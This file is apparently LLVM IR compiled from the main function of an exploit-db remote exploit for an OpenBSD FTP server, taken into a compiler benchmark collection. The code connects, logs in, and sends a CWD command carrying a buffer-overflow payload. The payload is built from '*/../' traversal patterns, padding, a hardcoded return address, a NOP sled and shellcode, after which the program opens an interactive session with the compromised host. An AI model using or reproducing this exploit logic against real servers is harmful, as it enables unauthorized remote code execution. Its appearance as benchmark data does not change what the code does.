; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/openbsd/remote/extr_20733.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/openbsd/remote/extr_20733.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [10 x i8] c"dc:l:p:s:\00", align 1
@debug = common dso_local global i64 0, align 8
@cflag = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@lflag = common dso_local global i32 0, align 4
@sflag = common dso_local global i32 0, align 4
@optind = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c"// basedir = \22%s\22\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"*/../\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"*/\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"// expbuf = \22%s\22\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"// explen = %d\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"// sendlen = %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@USER = common dso_local global i8* null, align 8
@PASS = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"// pad = %d\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.13 = private unnamed_addr constant [17 x i8] c"retaddr = %.8lx\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.14 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [14 x i8] c"Press enter..\00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [35 x i8] c"remember to remove the \22adfa\22-dir\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8, align 1
  %9 = alloca [512 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i64, align 8
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %21 = bitcast [512 x i8]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %21, i8 0, i64 512, i1 false)
  %22 = bitcast i8* %21 to [512 x i8]*
  %23 = getelementptr inbounds [512 x i8], [512 x i8]* %22, i32 0, i32 0
  store i8 76, i8* %23, align 16
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %22, i32 0, i32 1
  store i8 73, i8* %24, align 1
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %22, i32 0, i32 2
  store i8 83, i8* %25, align 2
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %22, i32 0, i32 3
  store i8 84, i8* %26, align 1
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %22, i32 0, i32 4
  store i8 32, i8* %27, align 4
  %28 = bitcast [512 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %28, i8 0, i64 512, i1 false)
  store i32 21, i32* %16, align 4
  br label %29

29:                                               ; preds = %67, %2
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call signext i8 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  store i8 %32, i8* %8, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp ne i32 %33, -1
  br i1 %34, label %35, label %68

35:                                               ; preds = %29
  %36 = load i8, i8* %8, align 1
  %37 = sext i8 %36 to i32
  switch i32 %37, label %61 [
    i32 100, label %38
    i32 99, label %41
    i32 108, label %43
    i32 112, label %55
    i32 115, label %58
  ]

38:                                               ; preds = %35
  %39 = load i64, i64* @debug, align 8
  %40 = add nsw i64 %39, 1
  store i64 %40, i64* @debug, align 8
  br label %67

41:                                               ; preds = %35
  store i32 1, i32* @cflag, align 4
  %42 = load i8*, i8** @optarg, align 8
  store i8* %42, i8** %7, align 8
  br label %67

43:                                               ; preds = %35
  store i32 1, i32* @lflag, align 4
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 @atoi(i8* %44)
  store i32 %45, i32* %12, align 4
  %46 = load i32, i32* %12, align 4
  %47 = icmp slt i32 %46, 16
  br i1 %47, label %48, label %54

48:                                               ; preds = %43
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @usage(i8* %51)
  %53 = call i32 @exit(i32 0) #4
  unreachable

54:                                               ; preds = %43
  br label %67

55:                                               ; preds = %35
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @atoi(i8* %56)
  store i32 %57, i32* %16, align 4
  br label %67

58:                                               ; preds = %35
  store i32 1, i32* @sflag, align 4
  %59 = load i8*, i8** @optarg, align 8
  %60 = call i64 @strtoul(i8* %59, i32 0, i32 0)
  store i64 %60, i64* %18, align 8
  br label %67

61:                                               ; preds = %35
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @usage(i8* %64)
  %66 = call i32 @exit(i32 0) #4
  unreachable

67:                                               ; preds = %58, %55, %54, %41, %38
  br label %29

68:                                               ; preds = %29
  %69 = load i32, i32* @cflag, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %71, label %74

71:                                               ; preds = %68
  %72 = load i32, i32* @lflag, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %80, label %74

74:                                               ; preds = %71, %68
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @usage(i8* %77)
  %79 = call i32 @exit(i32 0) #4
  unreachable

80:                                               ; preds = %71
  %81 = load i32, i32* %4, align 4
  %82 = load i32, i32* @optind, align 4
  %83 = sub nsw i32 %81, %82
  %84 = icmp eq i32 %83, 1
  br i1 %84, label %85, label %91

85:                                               ; preds = %80
  %86 = load i8**, i8*** %5, align 8
  %87 = load i32, i32* @optind, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  %90 = load i8*, i8** %89, align 8
  store i8* %90, i8** %10, align 8
  br label %97

91:                                               ; preds = %80
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @usage(i8* %94)
  %96 = call i32 @exit(i32 0) #4
  unreachable

97:                                               ; preds = %85
  %98 = load i32, i32* @AF_INET, align 4
  %99 = load i32, i32* @SOCK_STREAM, align 4
  %100 = call i32 @socket(i32 %98, i32 %99, i32 0)
  store i32 %100, i32* %15, align 4
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %105

102:                                              ; preds = %97
  %103 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %104 = call i32 @exit(i32 1) #4
  unreachable

105:                                              ; preds = %97
  %106 = load i8*, i8** %10, align 8
  %107 = call %struct.hostent* @gethostbyname(i8* %106)
  store %struct.hostent* %107, %struct.hostent** %20, align 8
  %108 = icmp eq %struct.hostent* %107, null
  br i1 %108, label %109, label %113

109:                                              ; preds = %105
  %110 = load i8*, i8** %10, align 8
  %111 = call i32 @herror(i8* %110)
  %112 = call i32 @exit(i32 0) #4
  unreachable

113:                                              ; preds = %105
  %114 = call i32 @memset(%struct.sockaddr_in* %19, i32 0, i32 12)
  %115 = load i32, i32* @AF_INET, align 4
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  store i32 %115, i32* %116, align 4
  %117 = load i32, i32* %16, align 4
  %118 = call i32 @htons(i32 %117)
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i32 %118, i32* %119, align 4
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  %121 = load %struct.hostent*, %struct.hostent** %20, align 8
  %122 = getelementptr inbounds %struct.hostent, %struct.hostent* %121, i32 0, i32 0
  %123 = load i32*, i32** %122, align 8
  %124 = getelementptr inbounds i32, i32* %123, i64 0
  %125 = load i32, i32* %124, align 4
  %126 = call i32 @memcpy(i32* %120, i32 %125, i32 4)
  %127 = load i32, i32* %15, align 4
  %128 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %129 = call i32 @connect(i32 %127, %struct.sockaddr* %128, i32 12)
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %131, label %134

131:                                              ; preds = %113
  %132 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %133 = call i32 @exit(i32 0) #4
  unreachable

134:                                              ; preds = %113
  %135 = load i64, i64* @debug, align 8
  %136 = icmp ne i64 %135, 0
  br i1 %136, label %137, label %141

137:                                              ; preds = %134
  %138 = load i32, i32* @stderr, align 4
  %139 = load i8*, i8** %7, align 8
  %140 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i8* %139)
  br label %141

141:                                              ; preds = %137, %134
  store i32 0, i32* %11, align 4
  br label %142

142:                                              ; preds = %152, %141
  %143 = load i32, i32* %11, align 4
  %144 = load i32, i32* %12, align 4
  %145 = add nsw i32 %144, 4
  %146 = sdiv i32 1024, %145
  %147 = sub nsw i32 %146, 1
  %148 = icmp slt i32 %143, %147
  br i1 %148, label %149, label %155

149:                                              ; preds = %142
  %150 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %151 = call i32 @strcat(i8* %150, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  br label %152

152:                                              ; preds = %149
  %153 = load i32, i32* %11, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %11, align 4
  br label %142

155:                                              ; preds = %142
  %156 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %157 = call i32 @strcat(i8* %156, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %158 = load i64, i64* @debug, align 8
  %159 = icmp ne i64 %158, 0
  br i1 %159, label %160, label %164

160:                                              ; preds = %155
  %161 = load i32, i32* @stderr, align 4
  %162 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %163 = call i32 (i32, i8*, ...) @fprintf(i32 %161, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i8* %162)
  br label %164

164:                                              ; preds = %160, %155
  %165 = load i32, i32* %11, align 4
  %166 = load i32, i32* %12, align 4
  %167 = add nsw i32 %166, 4
  %168 = mul nsw i32 %165, %167
  %169 = load i32, i32* %12, align 4
  %170 = add nsw i32 %168, %169
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %13, align 4
  %172 = load i64, i64* @debug, align 8
  %173 = icmp ne i64 %172, 0
  br i1 %173, label %174, label %178

174:                                              ; preds = %164
  %175 = load i32, i32* @stderr, align 4
  %176 = load i32, i32* %13, align 4
  %177 = call i32 (i32, i8*, ...) @fprintf(i32 %175, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i32 %176)
  br label %178

178:                                              ; preds = %174, %164
  %179 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %180 = call i32 @strlen(i8* %179)
  store i32 %180, i32* %14, align 4
  %181 = load i64, i64* @debug, align 8
  %182 = icmp ne i64 %181, 0
  br i1 %182, label %183, label %187

183:                                              ; preds = %178
  %184 = load i32, i32* @stderr, align 4
  %185 = load i32, i32* %14, align 4
  %186 = call i32 (i32, i8*, ...) @fprintf(i32 %184, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i32 %185)
  br label %187

187:                                              ; preds = %183, %178
  %188 = load i32, i32* %15, align 4
  %189 = call i32 @docmd(i32 %188, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.9, i64 0, i64 0), i32 0)
  %190 = load i32, i32* %15, align 4
  %191 = load i8*, i8** @USER, align 8
  %192 = call i32 @docmd(i32 %190, i8* %191, i32 0)
  %193 = load i32, i32* %15, align 4
  %194 = load i8*, i8** @PASS, align 8
  %195 = call i32 @docmd(i32 %193, i8* %194, i32 1)
  %196 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %197 = load i8*, i8** %7, align 8
  %198 = call i32 @snprintf(i8* %196, i32 512, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i64 0, i64 0), i8* %197)
  %199 = load i32, i32* %15, align 4
  %200 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %201 = call i32 @docmd(i32 %199, i8* %200, i32 1)
  %202 = load i32, i32* %13, align 4
  %203 = sub nsw i32 1027, %202
  store i32 %203, i32* %17, align 4
  %204 = load i64, i64* @debug, align 8
  %205 = icmp ne i64 %204, 0
  br i1 %205, label %206, label %210

206:                                              ; preds = %187
  %207 = load i32, i32* @stderr, align 4
  %208 = load i32, i32* %17, align 4
  %209 = call i32 (i32, i8*, ...) @fprintf(i32 %207, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0), i32 %208)
  br label %210

210:                                              ; preds = %206, %187
  br label %211

211:                                              ; preds = %217, %210
  %212 = load i32, i32* %17, align 4
  %213 = icmp sge i32 %212, 0
  br i1 %213, label %214, label %220

214:                                              ; preds = %211
  %215 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %216 = call i32 @strcat(i8* %215, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  br label %217

217:                                              ; preds = %214
  %218 = load i32, i32* %17, align 4
  %219 = add nsw i32 %218, -1
  store i32 %219, i32* %17, align 4
  br label %211

220:                                              ; preds = %211
  %221 = load i32, i32* @sflag, align 4
  %222 = icmp ne i32 %221, 0
  br i1 %222, label %236, label %223

223:                                              ; preds = %220
  %224 = load i32, i32* %12, align 4
  switch i32 %224, label %227 [
    i32 16, label %225
    i32 26, label %226
  ]

225:                                              ; preds = %223
  store i64 3753814880, i64* %18, align 8
  br label %226

226:                                              ; preds = %223, %225
  store i64 3753836096, i64* %18, align 8
  br label %227

227:                                              ; preds = %223, %226
  %228 = load i32, i32* %12, align 4
  %229 = sub nsw i32 %228, 17
  %230 = mul nsw i32 %229, 2496
  %231 = add i32 -541148640, %230
  %232 = zext i32 %231 to i64
  store i64 %232, i64* %18, align 8
  br label %233

233:                                              ; preds = %227
  %234 = load i64, i64* %18, align 8
  %235 = add nsw i64 %234, 20
  store i64 %235, i64* %18, align 8
  br label %236

236:                                              ; preds = %233, %220
  %237 = load i32, i32* @stderr, align 4
  %238 = load i64, i64* %18, align 8
  %239 = call i32 (i32, i8*, ...) @fprintf(i32 %237, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.13, i64 0, i64 0), i64 %238)
  %240 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %241 = bitcast i64* %18 to i8*
  %242 = call i32 @strncat(i8* %240, i8* %241, i32 4)
  %243 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %244 = call i32 @strlen(i8* %243)
  store i32 %244, i32* %11, align 4
  br label %245

245:                                              ; preds = %254, %236
  %246 = load i32, i32* %11, align 4
  %247 = load i8*, i8** @shellcode, align 8
  %248 = call i32 @strlen(i8* %247)
  %249 = sub nsw i32 508, %248
  %250 = icmp slt i32 %246, %249
  br i1 %250, label %251, label %257

251:                                              ; preds = %245
  %252 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %253 = call i32 @strcat(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  br label %254

254:                                              ; preds = %251
  %255 = load i32, i32* %11, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %11, align 4
  br label %245

257:                                              ; preds = %245
  %258 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %259 = load i8*, i8** @shellcode, align 8
  %260 = call i32 @strcat(i8* %258, i8* %259)
  %261 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %262 = call i32 @strcat(i8* %261, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0))
  %263 = load i32, i32* @stderr, align 4
  %264 = call i32 (i32, i8*, ...) @fprintf(i32 %263, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.16, i64 0, i64 0))
  %265 = load i32, i32* @stderr, align 4
  %266 = call i32 @fflush(i32 %265)
  %267 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %268 = load i32, i32* @stdin, align 4
  %269 = call i32 @fgets(i8* %267, i32 511, i32 %268)
  %270 = load i32, i32* %15, align 4
  %271 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %272 = call i32 @docmd(i32 %270, i8* %271, i32 0)
  %273 = load i32, i32* @stderr, align 4
  %274 = call i32 (i32, i8*, ...) @fprintf(i32 %273, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.17, i64 0, i64 0))
  %275 = load i32, i32* %15, align 4
  %276 = call i32 @communicate(i32 %275)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @usage(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @strtoul(i8*, i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memcpy(i32*, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @docmd(i32, i8*, i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #2

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @fgets(i8*, i32, i32) #2

declare dso_local i32 @communicate(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
